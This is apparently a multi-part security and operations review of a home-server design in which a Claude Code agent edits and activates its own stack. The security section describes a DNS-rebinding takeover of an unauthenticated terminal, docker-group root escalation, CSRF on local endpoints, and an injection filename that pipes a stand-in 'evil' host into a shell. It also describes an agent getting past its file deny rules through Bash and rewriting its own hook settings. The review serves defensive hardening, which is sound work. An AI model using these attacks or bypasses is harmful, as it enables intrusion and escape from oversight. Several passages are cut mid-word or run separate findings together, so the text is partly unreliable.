## LENS: ops-transactional

VERDICT: The Overhaul Engine's shape is right (staged build, validate, small-diff activate, bounded repair, git-first rollback), and §4.7's corrections to the external critiques are genuinely correct. But the operational plumbing has real holes: the bootstrap zfs create as written fails on a machine whose /blazing already holds data; the checkpoint step cannot take snapshots as user leo; 'compose up -d' is a no-op cutover/rollback for bind-mounted config changes, so probes can pass against stale state and auto-revert can silently not restore anything; a crash mid-activate leaves no activation commit for the documented rollback to revert; and the gateway's 127.0.0.1 site address plus host-loopback watcherd is unreachable unless Caddy runs host-network, which the design never states. The PostToolUse hook as described defeats the debounce/Glance-delay choreography it sits beside. All are fixable with modest spec changes before phase 0-3; none invalidates the architecture.

### [CRITICAL] §15 / §3.1 (zfs create blazing/stack ... + 'repo from day 0')
PROBLEM: The bootstrap line `zfs create blazing/stack blazing/modes blazing/hf blazing/docker blazing/generated` is invalid — `zfs create` accepts exactly one filesystem per invocation. Worse, the design never handles the fact that this machine is already in use: if /blazing/stack (or /blazing/docker, /blazing/hf — HF cache and Docker data-root may already exist) is a non-empty directory inside the parent dataset, `zfs create` creates the child dataset but the mount is refused ('directory is not empty'), or an overlay mount shadows the existing data. Either way the existing files are stranded in the parent dataset, invisible under the new mountpoint, and sanoid then snapshots empty datasets while the real data sits unsnapshotted in `blazing`.
SCENARIO: Phase 0 bootstrap: the one-liner errors on the second argument; after splitting it, `zfs create blazing/docker` on the host whose Docker data-root was already moved to /blazing/docker (§3.7) fails to mount or shadows ~100GB of images. Docker starts against an empty data-root; the 'checkpoint' snapshots taken by overhaulctl protect none of the pre-existing content.
FIX: One `zfs create` per dataset, and an explicit migration recipe in §15: for each path that already exists non-empty — `zfs create -o mountpoint=none blazing/X.new`, `zfs set mountpoint=/blazing/.migrate/X`, rsync/mv the old directory in, destroy/rename the old dir, then `zfs set mountpoint=/blazing/X`. Add a preflight assert: for each planned dataset, either the path is absent/empty or `zfs list` already shows it as a dataset; fail loudly otherwise. Stop Docker before migrating blazing/docker.

### [MAJOR] §4.3 / §4.4 (Checkpoint = zfs snapshot; 'snapshots are root-owned; Claude runs as leo')
PROBLEM: The design uses root-ownership of ZFS as a safety property ('snapshot deletion is simply not reachable') but never grants snapshot *creation*. overhaulctl runs as leo (it must — Claude invokes it, and §4.4 forbids bypass modes), and unprivileged users cannot `zfs snapshot`. As written, the Checkpoint step of every job fails at step one, and `zfs clone` rehearsals (§4.7) fail the same way.
SCENARIO: First overhaul job: `overhaulctl checkpoint` runs `zfs snapshot blazing/stack@job-001` as leo → 'permission denied'. Either checkpointing silently degrades to git-only (losing the dataset-level restore the whole §4 story depends on), or someone adds blanket `sudo zfs` to sudoers, which also grants `sudo zfs destroy/rollback` and demolishes the 'deletion is not reachable' guarantee.
FIX: Use ZFS delegation, which preserves the asymmetry the design wants: `sudo zfs allow -u leo snapshot,clone,mount,hold blazing/stack blazing/modes` (and whatever the spec's checkpoint list can name). Do NOT delegate destroy/rollback — those stay root-only, keeping §4.4's claim true. Document this in §4.4 and add it to the §15 preflight; note the [TEST] that delegated snapshot works on this OpenZFS build.

### [MAJOR] §4.2 wave 4 / §4.3 Activate & rollback ('compose up -d (changed services)', 'git revert ... + compose up -d')
PROBLEM: `docker compose up -d` recreates a container only when its *service definition* (compose file, image, env-file) changed — Compose hashes the config, not the contents of bind-mounted files. Almost everything this engine activates (Caddyfile, glance.yml, theme includes, shell files) is a bind-mounted file edit with an unchanged compose.yaml. So both the cutover ('compose up -d for services whose config changed') and the rollback ('git revert of activation commit + compose up -d') are no-ops for the common case. Caddy and Glance happen to self-reload (caddy reload is called explicitly; Glance fsnotify), but any service without an internal reloader (Twenty env/config, n8n, Immich config) keeps running the old config while the runner believes it activated/reverted.
SCENARIO: Rollback path: probe fails, runner does `git revert` + `compose up -d`; no service definition changed, so zero containers restart. The broken bind-mounted config file is now reverted on disk but the running container state may be whatever the half-activation left (e.g. Glance already reloaded the bad include, Caddy already reloaded). Probe re-runs against this mixture; or worse, cutover case: probe sweeps HTTP 200 against containers still serving the *old* config and the job is recorded as a suc
FIX: Make the activation/rollback contract explicit per service in contracts/<component>.md: 'reload mechanism = caddy reload | fsnotify-automatic | docker compose restart <svc> | up -d --force-recreate <svc>'. The runner derives the reload action from the changed paths (it already has a path→panel map in watcherd — reuse it as path→service), and the probe wave must verify applied-config, not just HTTP 200 (e.g. a version/etag endpoint, Glance page containing the new theme token, caddy's config hash via admin API).

### [MAJOR] §4.1 / §4.3 (state.json resume model; Activate = 'rsync staged→live in one git commit')
PROBLEM: Activation is not atomic and its failure window is exactly where the recovery story is undefined. rsync of staged files to live paths, THEN a git commit: a crash, OOM-kill, or power loss between the rsync and the commit leaves (a) live paths half-overwritten, (b) no 'activation commit' for the documented `git revert` rollback to target, and (c) state.json saying wave 4 in-progress with no defined per-task resume semantics (the doc specifies resume only at wave granularity, and waves like activate and asset_gen are not idempotent as described). The same gap applies to probe-failure auto-revert: §4.3's auto-revert re-ups services but omits `modectl apply <previous>`, which the spec's rollback string includes — Plasma/lock-screen/browser state changed by wave 4 is outside git entirely.
SCENARIO: Kernel OOM kills the runner mid-rsync of a 40-file layout overhaul. On resume, state.json says wave=4 attempt=1; the runner's options are re-rsync (fine only if rsync is the whole wave and is idempotent — but 'compose up -d, modectl apply, SSE' already partially ran) or revert — but `git log` shows no activation commit to revert, and `git status` shows a dirty tree mixing staged content with pre-job content. Nothing in the spec tells the runner (or a resuming Claude session) which world it is in
FIX: Define the activation protocol journal-first: before touching live paths, the runner records pre-activation HEAD and 'activate:started' in state.json (runner-owned, already deny-listed). Recovery rule becomes mechanical: if activate:started && no activation commit → `git reset --hard <recorded HEAD>` (tree is the repo, so this is the atomic undo), re-run wave 4 from scratch; waves must each declare idempotent|restartable|checkpoint-per-task in the spec schema. Make the full revert sequence (git revert + per-service reload action + `modectl apply <previous>` + SSE) one named runner routine used by both probe-failure and `overhaulctl rollback`. Also note: state.json, logs, and overhaulctl itself live inside blazing/stack — the dataset a manual `zfs rollback` reverts — so copy the failure report and state.json to a path outside the snapshotted dataset (e.g. scratch/) before any manual rollback; otherwise the rollback destroys the record of why it was needed.

### [MAJOR] §5 Gateway (Caddy in compose, site address 127.0.0.1:8080) + §5 watcherd ('typed SSE at /events (via Caddy)')
PROBLEM: Two networking facts collide with 'Caddy in compose': (1) with default bridge networking, a Caddy whose site address binds 127.0.0.1 listens on the *container's* loopback — traffic from a published port arrives on the container's eth0 and is refused, so the gateway is unreachable from the kiosk entirely; (2) watcherd is a host daemon presumably bound to host 127.0.0.1, which a bridge-networked container cannot reach at all (host.docker.internal/host-gateway reaches host interfaces, not host loopback). The design never says network_mode: host, and the research digest's '127.0.0.1:8080 site address' fix only works in host network mode. The `ss -tlnp` smoke test and 'curl from another host must fail' check behave differently in each mode, so the security verification steps are mode-dependent and currently unspecified.
SCENARIO: Phase 3: compose up with the default bridge network and ports '127.0.0.1:8080:8080' plus the documented Caddyfile site address 127.0.0.1:8080 → every kiosk panel 502s/connection-refused; or the builder 'fixes' it by binding the site to :8080 and watcherd to 0.0.0.0 so Caddy can reach it — silently LAN-exposing the reload/jobs/sim-runner API (which can start GPU jobs and POST /reload), the exact class of exposure §5 is designed to prevent.
FIX: Decide and document the mode now: run Caddy with `network_mode: host` (then the Caddyfile site address 127.0.0.1:8080 is correct as written, host-loopback watcherd/ttyd are reachable, and ss -tlnp semantics match the doc), or keep bridge mode and accept that watcherd must bind the docker bridge gateway IP with an iptables/DOCKER-USER rule restricting source to the caddy container. Host-network is the simpler, auditable choice for a loopback-only single-user gateway; record it in the compose file with a comment explaining why.

### [MAJOR] §2 / §5 watcherd (PostToolUse hook 'POSTs the same events — belt and braces')
PROBLEM: Three writers race on the same reload channel: Glance's internal fsnotify reload (~500ms debounce), watcherd's inotify path (1.5s debounce + 1s extra Glance delay — deliberately sequenced after Glance's reparse), and the PostToolUse hook, which fires per Edit/Write immediately and 'POSTs the same events'. If the hook POST emits SSE directly, it defeats the entire debounce/delay choreography: the Glance iframe reloads ~0s after the write, before Glance's server-side reparse finishes — exactly the stale-config failure the research digest documented — and each panel then reloads a second time when watcherd's debounced event lands. Multi-edit turns (a mode switch touches 5+ files) produce a reload storm through the hook path even though watcherd coalesces its own. Separately, neither watcher is scoped to exclude jobs/<id>/artifacts/ and staging/ — build waves write heavily there, generating reload events for files that aren't live.
SCENARIO: Claude edits glance.yml; hook POSTs instantly → iframe reloads at t+0.2s showing the OLD config (Glance hasn't reparsed) → watcherd fires at t+2.5s → second reload shows the new config. User (and Claude's own probe) intermittently observes 'hot reload is broken'; during overhaul build waves the dash strobes on every artifact write.
FIX: Make watcherd's POST /reload endpoint feed the same per-panel debounce queue as the inotify path (hook = early *signal into* the debouncer, never a direct SSE emit), keep the Glance +1s post-debounce delay as the single authority, and dedupe events per panel per window. Exclude /blazing/stack/{jobs,staging}/** in both the hook matcher filter and watcherd's watch list; activation's rsync to live paths is what should generate events.

### [MAJOR] §2/§10 (watcherd as host daemon; runner uses systemd-run --user) + §4.4 (survives kiosk/gateway death)
PROBLEM: The sim runner inside watcherd calls `systemd-run --user`, which requires a connection to leo's per-user systemd manager (XDG_RUNTIME_DIR=/run/user/<uid>, DBUS_SESSION_BUS_ADDRESS). The design never states how watcherd itself is launched. If it's a system unit (the natural reading of 'HOST daemon'), systemd-run --user fails with 'Failed to connect to bus'; if it's a user unit WantedBy=graphical-session.target (like the kiosk), then watcherd — and every transient sim@N unit, plus in-flight overhaul jobs it coordinates — dies when the graphical session restarts or the user logs out, contradicting §4.4's recovery-independence claim. Also [TEST]: transient unit names containing '@' (sim@N) are instance names that systemd-run may reject depending on version; a plain `sim-N` name avoids the question.
SCENARIO: Plasma crashes (the exact scenario §5's version-hold worries about) or Leo logs out during a 2-hour asset_gen wave: graphical-session.target goes down, watcherd's user unit and all sim@N transient units are stopped, the overhaul job dies mid-wave with GPU processes killed or orphaned — the event that's supposed to be survivable by design.
FIX: Specify watcherd as a *lingering* user service: `loginctl enable-linger leo`, unit WantedBy=default.target (NOT graphical-session.target), so the user manager and watcherd outlive the graphical session and systemd-run --user works by construction. Keep only the kiosk bound to graphical-session.target. Name transient units sim-N; add 'watcherd survives `systemctl --user restart plasma-*` / logout' to the phase-3 gate.

### [MINOR] §5 Kiosk ops ('Restart=on-failure') vs §5 Keyboard reality ('Restart=always as backstop')
PROBLEM: Internal contradiction with a concrete consequence: Chrome closed by Ctrl+W/Ctrl+Shift+Q (the very event the keyboard section is defending against) exits with code 0 — a clean exit that `Restart=on-failure` does NOT restart. The keyboard section's last line of defense therefore doesn't exist under the kiosk section's unit definition.
SCENARIO: Focus is in a sibling iframe where the preventDefault layer doesn't apply and the guard extension has failed to load (e.g. after a Chrome update); muscle-memory Ctrl+W closes the kiosk window; Chrome exits 0; the unit stays dead until the 04:30 recycle timer — a dark top monitor for hours, and the kiosk-pingback probe of any running overhaul job fails, triggering a spurious auto-revert.
FIX: Use `Restart=always` with `RestartSec=2` (and `StartLimitIntervalSec=60 StartLimitBurst=5` so a crash-loop still gives up visibly). Reconcile the two subsections so the unit file is specified once. Note the 04:30 recycle then uses `systemctl --user restart`, which is compatible with Restart=always.

## LENS: security-envelope

VERDICT: The design's functional architecture is strong, but §4.4's central security claim — an 'enforced, not promised' permission envelope — does not survive contact: file deny rules don't bind Bash, docker-group membership is root-equivalence that reaches the 'unreachable' ZFS snapshots, and the enforcement artifacts (settings.json, bin/, hooks) are writable by the constrained party. The 'localhost-only' property is likewise asserted per-process while Docker's default 0.0.0.0 publishes (and a Caddy-in-container loopback-bind contradiction) silently break it, and the unauthenticated writable ttyd served around Caddy is the single most dangerous endpoint on the machine. Four structural fixes recover most of the story: root-promote the runner/recovery/powerguard binaries out of leo's write set, loopback-pin every compose publish via daemon.json plus explicit port prefixes, put the Claude panel behind Caddy with injected auth, and add a real secrets layer before the day-0 GitHub push. None require rearchitecting; all are cheapest before phase 1 ships.

### [CRITICAL] §4.4 Permission envelope
PROBLEM: The deny rules are described as 'enforced, not promised', but Claude Code file deny rules (Edit/Write on bin/**, jobs/*/state.json, .git/**, unit sources) constrain only the Edit/Write tools — they do not constrain Bash, and the panel session's entire purpose is running Bash as leo. Every protected path is owned by leo, and .claude/settings.json itself (which holds the deny rules and the PostToolUse hook definitions) lives inside the repo Claude edits and is not in its own deny list.
SCENARIO: A prompt-injected or simply confused Claude session runs `sed -i`/`tee`/`python` against bin/overhaulctl, jobs/<id>/state.json, or .claude/settings.json — no deny rule fires, because they were never Edit/Write tool calls. Editing settings.json also lets it add a new hook, which executes as arbitrary shell in every subsequent session, including the headless `claude -p` dashboard-button invocations that start fresh and autonomous. The recovery machinery and the envelope that guards it are both wri
FIX: Reword §4.4 to 'guardrail against accidents, not a security boundary', and move the actual boundary out of leo's write set: install overhaulctl/watcherd/powerguard and their systemd units root-owned under /usr/local (the repo holds sources; a root-run `make install` promotes them), keep state.json integrity via the runner writing to a root-owned or append-only location, and add deny rules for Bash write-patterns only as a speed bump. Explicitly list .claude/settings.json and .mcp.json in the deny rules and in the runner's preserve-path refusal.

### [CRITICAL] §4.4 / §2 (Docker on host)
PROBLEM: "ZFS snapshots are root-owned; Claude runs as leo — snapshot deletion is simply not reachable" is false as designed, because the design has Claude/the runner invoking `docker compose up -d` directly, which requires leo in the docker group — and docker-group membership is documented root-equivalence (`docker run -v /:/host --privileged`).
SCENARIO: Any code running as leo (Claude session, a hook, a compromised pip package in the comfy/newton envs) starts a privileged container with the host root mounted, then destroys ZFS snapshots, rewrites root-owned recovery scripts, or edits /etc/sudoers. The 'recovery independent of the changed application' guarantee and the snapshot safety floor (§3) both evaporate through the docker socket.
FIX: Either (a) run Docker rootless for the stack services (Immich CUDA needs nvidia-ctk cdi support in rootless — verify), or (b) keep rootful Docker but front the socket with a docker-socket-proxy that only exposes compose-needed endpoints and denies privileged/bind-mount-of-/ requests, and have the runner talk to the proxy. At minimum, delete the 'not reachable' claim and add a second safety net that leo genuinely cannot touch: root-owned syncoid pull-replication of blazing/stack+modes snapshots to tank.

### [CRITICAL] §2 / §5 Gateway / §15 compose services
PROBLEM: The localhost-only story is argued per-process (Caddy site address 127.0.0.1:8080, ttyd -i 127.0.0.1) but never per-Docker-publish. Docker publishes ports on 0.0.0.0 by default and punches through host firewalls via its own iptables chains. Immich is explicitly 'on its own port' (must be published for the kiosk), and Twenty, n8n, beszel hub, and the Immich Postgres/Redis sidecars all come from stock compose files with 0.0.0.0 publishes. Worse, Caddy *inside* a container with site address 127.0.0.1:8080 binds the container's loopback, which the docker-proxy cannot reach — the gateway as written is either dead or gets 'fixed' by binding 0.0.0.0 in-container, silently LAN-exposing it.
SCENARIO: Phase 3 goes up, `ss -tlnp | grep 8080` is checked as specified and looks fine, but 2283 (entire photo library), Twenty (candidate PII, API-key auth), and n8n (holds the Gmail OAuth refresh token, webhook endpoints) are listening on 0.0.0.0 for the whole LAN; or alternatively the Caddy loopback-in-container contradiction breaks the dashboard on day one and the quick fix is the exposure.
FIX: Set `"ip": "127.0.0.1"` in /etc/docker/daemon.json as the default publish address, AND prefix every `ports:` entry `127.0.0.1:` in the repo's compose files (stock Immich/Twenty/n8n composes must be overridden, not copied). For Caddy, either run it with `network_mode: host` and site address 127.0.0.1:8080, or bind :8080 in-container and publish `127.0.0.1:8080:8080`. Extend the smoke test from 'grep 8080' to 'no non-loopback listener in `ss -tlnp` except sshd/tailscale', run by watcherd after every compose change.

### [CRITICAL] §6 Claude panel (direct :7681, no auth)
PROBLEM: The writable ttyd (root-equivalent per the design's own research) is served permanently, with zero authentication, directly on 127.0.0.1:7681 — explicitly bypassing Caddy. 'On pure-localhost this is moot (nothing else can reach it)' is wrong: browsers on the machine reach loopback. ttyd's -O only rejects WebSocket upgrades whose Origin header mismatches the request Host — under DNS rebinding (evil.com → 127.0.0.1, page fetches evil.com:7681) Origin and Host both read evil.com and the check passes; ttyd does no Host validation. Bypassing Caddy also discards Caddy's exact-host site matching, which would have defeated rebinding for free. The stated reason for direct serving (survive gateway breakage) is already covered by the tmux/TTY recovery path in §4.4.
SCENARIO: Leo browses in his daily Chrome/Firefox profile; a malicious page performs DNS rebinding against port 7681, opens the WebSocket, and types into the live Claude tmux session — including pressing Shift+Tab and approving Claude's own permission prompts. Drive-by web page → interactive shell as leo → (via issue 2) root.
FIX: Serve the panel through Caddy at 127.0.0.1:8080 with `header_up Authorization "Basic …"` injected on the /claude route (the design already documents this mechanism) and keep ttyd bound to loopback with -O; gateway breakage is handled by the existing tmux/Konsole recovery, not by the iframe. If direct serving is kept anyway, require a high-entropy secret: `ttyd -b /<random-192-bit>` with credential-equivalent treatment of the path, and never run the §17.9 CDP fallback (--remote-debugging-port) persistently — it is a second unauthenticated loopback channel that can type into this same panel.

### [MAJOR] §8.3 Browser theming / §15 (`install -d -o leo /etc/opt/chrome/policies/managed`)
PROBLEM: Making the Chrome managed-policy directory leo-writable hands every process running as leo full machine-wide Chrome policy control — not just BrowserThemeColor. Managed policies include ExtensionInstallForcelist (silent force-install of an arbitrary extension = persistent code execution in the browser), ProxySettings (MITM all traffic), PasswordManagerEnabled, SafeBrowsing toggles — and they apply to ALL profiles: the kiosk profile, the 'agent browser profile', and Leo's personal profile with Gmail/Google OAuth/LinkedIn Recruiter sessions. This single chown defeats the §3.4 agent-profile hygiene boundary.
SCENARIO: Anything that achieves leo-level code execution (prompt-injected Claude, malicious ComfyUI custom node, compromised npm/pip dep) drops a policy JSON force-installing an exfiltration extension; Chrome's file-watcher applies it to running windows in seconds, across every profile, surviving reboots and looking like legitimate enterprise management.
FIX: Keep /etc/opt/chrome/policies/managed root-owned. Add one root-owned helper at /usr/local/sbin/chrome-theme (not in /blazing/stack) with a NOPASSWD sudoers line, which accepts a single argument, validates it matches ^#[0-9a-fA-F]{6}$, and writes exactly {"BrowserThemeColor": "<arg>"} to mode.json — the research digest's own alternative. modectl calls `sudo chrome-theme '#aabbcc'`.

### [MAJOR] §5 watcherd / §10 sim runner API
PROBLEM: watcherd exposes mutating HTTP endpoints (POST /reload/<panel>, POST /sim/run, POST /sim/stop, powerguard hooks, kiosk heartbeat) with no authentication or CSRF defense specified. A loopback bind does not stop cross-origin simple POSTs from any browser on the machine (the request fires even though the response is unreadable), nor any local process. /sim/run spawns `systemd-run … python scene.py` from caller-supplied input. Separately, the PostToolUse hook POSTs file paths taken from hook JSON — if the hook script interpolates the path into a shell/curl command line unquoted, a crafted filename (which Claude can be induced to Write) is command injection in the hook's context.
SCENARIO: A web page in any browser on the box form-POSTs http://127.0.0.1:8080/sim/run with a scene path/params of its choosing → arbitrary Python under systemd-run as leo on GPU1; or a file named `x$(curl evil|sh).yml` written by Claude detonates inside the PostToolUse hook shell.
FIX: Require a random bearer token in a custom header on every mutating watcherd endpoint (custom headers force a CORS preflight, killing CSRF; the shell page fetches the token from a same-origin file Caddy serves only on the loopback site). Server-side, /sim/run must accept only an enum of vetted template names plus schema-validated params — never a path (the §10 'parameterized templates' promise must be enforced in the runner, not just in Claude's instructions). Write the hook to read hook JSON from stdin with jq and pass the path as argv/--data-binary, never via string-interpolated shell.

### [MAJOR] §3.3 / §12 / §15 (repo = system of record, .mcp.json, n8n, OAuth)
PROBLEM: There is no secrets-management story at all. /blazing/stack is pushed to GitHub on every commit and '.mcp.json' is listed as repo content — Twenty MCP needs an API key, Immich REST needs an API key, compose files need the n8n encryption key (which protects the Gmail OAuth refresh token in n8n's DB), Postgres passwords, and the Google OAuth client secret. The design also states 'any Claude session reads the repo for total context', guaranteeing secrets land in model context and transcripts.
SCENARIO: One `git commit -A` (the checkpoint step literally does this) sweeps a key into history and post-commit-pushes it to GitHub; a GitHub token leak, a mis-set repo visibility, or any transcript exposure now yields standing access to Gmail send-as-Leo (the sequence engine), the full photo library, and candidate PII — and keys in git history survive deletion.
FIX: Create /blazing/stack/secrets/ in .gitignore (or a dataset outside the repo), chmod 600; reference secrets via env expansion — Claude Code .mcp.json supports ${VAR}, compose supports env_file. Add gitleaks as a pre-commit/pre-push hook from day 0 (phase 1 gate), and state explicitly that the Gmail refresh token lives only in n8n's DB with N8N_ENCRYPTION_KEY stored outside the repo.

### [MAJOR] §3.5 / §14 powerguard
PROBLEM: powerguard needs root (`nvidia-smi -pl`, `zpool sync`, shutdown, stopping containers) AND leo's session bus (`fx paused` via qdbus to plasmashell) — two privilege domains one process can't hold — yet it lives in /blazing/stack/bin/ (leo-writable, Claude-edited, and 'protected' only by the bypassable deny rules of issue 1). The design never says how it gets root. The obvious wirings are all wrong: NUT's NOTIFYCMD/upssched running a repo script as root means root executes leo-writable code (trivial escalation, closing the loop with issue 1); running powerguard as leo means -pl and zpool silently fail exactly when the UPS is draining.
SCENARIO: Power drops during a dual-GPU ComfyUI run; powerguard-as-leo gets 'permission denied' from nvidia-smi -pl, draw stays over the CyberPower 1500's ceiling, and the UPS cuts out mid-write — the precise scenario §3.5 exists to prevent. Or, wired as root-runs-repo-script, any leo compromise edits bin/powerguard and triggers a NUT notify event for instant root.
FIX: Split it: a root-owned script installed to /usr/local/sbin (promoted from the repo by a root install step, not executed in place) handles -pl/zpool/container-stop/shutdown, invoked by upsmon/upssched or via sudoers lines pinned to exact commands (`nvidia-smi -pl 150`); the root side then touches a state flag or emits a systemd event that a leo user unit watches to run fx/SIGSTOP/qdbus in the session. Test the full shed path under load as part of the phase-0 gate.

## LENS: failure-recovery

VERDICT: The design's recovery story is strong where it was explicitly adversarially reviewed (validate gates, direct-port Claude panel, bounded repair, git-revert-first rollback) but has a blind spot at the display layer and at timer/job interactions: file-state recovery is well specified while screen-state recovery is not (the §4.6 drill as written restores disk but leaves a broken kiosk on screen, and the Claude panel's independence evaporates when the shell DOM itself is broken), the 04:30 recycle can race a probe wave into auto-reverting good activations, the activate wave's atomicity/resume semantics and the no-activation-commit rollback case are unspecified, and the single most likely real-world failure (SVWR soak fails) is answered with a named fallback whose switching mechanism, fx dial, lock-screen capability and codec path are all incompatible with the primary design as written. All eight scenarios are fixable with modest, concrete additions (out-of-band kiosk reload in the revert path, job-aware recycle guard with probe grace, write-ahead task journaling plus idempotent activate, a wallpaper driver interface plus fallback-aware soak gate, supervised tmux/ttyd with a sanctioned Claude-iframe remount exception, an Immich path-immutability contract, and session-scoped Wayland asserts) — none requires rearchitecting, but the first three should land before the phase-1 gate because the §4.6 acceptance drill itself cannot genuinely pass without them.

### [CRITICAL] §4.3/§4.6 Overhaul lifecycle — probe auto-revert vs the kiosk display
PROBLEM: Auto-revert restores files but has no mechanism to restore the SCREEN. The only paths to reload the shell page are (a) the shell's own SSE listener JS and (b) the 04:30 recycle. When Claude breaks the shell page (scenario 1), the SSE listener is dead code in the browser; when it also breaks the Caddyfile semantically (passes `caddy validate`, wrong upstream), /events is gone too. The Claude panel does NOT survive this either — it is direct-from-:7681 only at the network layer, but its iframe lives inside the broken shell DOM, so the 'terminal survives gateway breakage' guarantee silently depends on the shell page being intact.

### [MAJOR] §4.3 activate wave — atomicity and resume semantics unspecified; §3.5 powerguard blind to overhauls
PROBLEM: Activate is multi-step and non-atomic (rsync staged→live, git commit, compose up, caddy reload, modectl apply, SSE), but the design never requires the tasks to be idempotent or journaled, and the rollback primitive ('git revert of activation commit') assumes the commit exists. Power loss between rsync and commit leaves a dirty live tree with NO activation commit to revert — the documented rollback path dangles. Separately, powerguard's on-battery shedding (GPU cap, SIGSTOP sims, fx paused) and 60s graceful shutdown never pause the overhaul runner, so the box can power off mid-activate by design.
SCENARIO: Power dies (or powerguard's 60s shutdown kills the runner) after rsync copied 4 of 9 staged files. FIX: Spec it: (1) each activate task must be idempotent and re-runnable, and the runner journals intent to state.json BEFORE each task (write-ahead), recording the commit hash immediately after commit; (2) resume of an incomplete activate wave = re-run the whole wave from the top (rsync is naturally idempotent); (3) rollback handles the no-commit case with `git checkout -- <staged paths>` / `git clean` scoped to the job's file list; (4) powerguard's on-battery hook also sends overhaulctl a 'pause at next task boundary' signal before the shutdown timer.

### [MAJOR] §6 Claude panel — tmux server death leaves a dead center panel with no supervisor and no remount path

SCENARIO: tmux segfaults (or is OOM-killed) mid-evening. ### [MINOR] §7 fx dial ('away') + §5 screen blanking
